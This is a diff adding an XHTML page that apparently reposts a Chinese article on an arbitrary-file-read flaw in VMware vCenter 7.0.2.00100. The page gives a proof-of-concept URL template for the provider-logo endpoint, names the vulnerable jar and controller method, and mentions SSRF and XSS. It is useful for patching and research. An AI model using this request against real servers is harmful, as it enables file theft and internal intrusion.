@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>VMWare vCenter 7.0.2.00100任意文件读取/</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>VMWare vCenter 7.0.2.00100任意文件读取/</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzkwNDI1NDUwMQ==&amp;mid=2247485404&amp;idx=1&amp;sn=7ec527f76d065be8f259641879cf4f56&amp;chksm=c0888296f7ff0b803765c2c8dad18b134c62a28e752ff2d56006c749456fb819eef11be29911&amp;scene=126&amp;sessionid=1681654889#rd">http://mp.weixin.qq.com/s?__biz=MzkwNDI1NDUwMQ==&amp;mid=2247485404&amp;idx=1&amp;sn=7ec527f76d065be8f259641879cf4f56&amp;chksm=c0888296f7ff0b803765c2c8dad18b134c62a28e752ff2d56006c749456fb819eef11be29911&amp;scene=126&amp;sessionid=1681654889#rd</a></blockquote><section style="font-size: 16px;"><p><span style="font-size: 20px;font-weight: bold;">poc：</span></p><p>https://{vCenterserver}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url={url}</p><p><br/></p><p><span style="font-size: 20px;font-weight: bold;">漏洞点：</span></p><p>/etc/vmware/vsphere-ui/cm-service-packages/com.vmware.cis.vsphereclient.plugin/com.vmware.h4.vsphere.client-0.4.1.0/plugins/h5-vcav-bootstrap-service.jar</p><p><br/></p><p>com.vmware.h4.vsphere.ui.bootstrap.controller.ProvidersController.getProviderLogo()</p><p><br/></p><p>任意文件读取</p><section><img data-ratio="1" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/ZZc0TFxLh19ibN7gc5TZdzFPOzVrFwydv5XnNKx5o0vLNlricYR51YgfJKWx3hlKCFQImFMzVqoicLtoibYpclC78g/640?wx_fmt=jpeg" data-type="jpg" data-w="auto" src="../Images/73f0f832cee84459897cb0caa26f178b.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/ZZc0TFxLh19ibN7gc5TZdzFPOzVrFwydv5XnNKx5o0vLNlricYR51YgfJKWx3hlKCFQImFMzVqoicLtoibYpclC78g/640?wx_fmt=jpeg"/>​</section><p><br/></p><p>ssrf+xss</p><section><img data-ratio="1" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/ZZc0TFxLh19ibN7gc5TZdzFPOzVrFwydvx5MxeyH7OXpZPjRGx13ibIfElYEHgX1b3ibp5bEh4cEM8lEQQib8oozAw/640?wx_fmt=jpeg" data-type="jpg" data-w="auto" src="../Images/5ca96d210be8bfad7b817e45f61aff07.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/ZZc0TFxLh19ibN7gc5TZdzFPOzVrFwydvx5MxeyH7OXpZPjRGx13ibIfElYEHgX1b3ibp5bEh4cEM8lEQQib8oozAw/640?wx_fmt=jpeg"/>​</section><p><br/></p></section>
+        
+</body>
+</html>
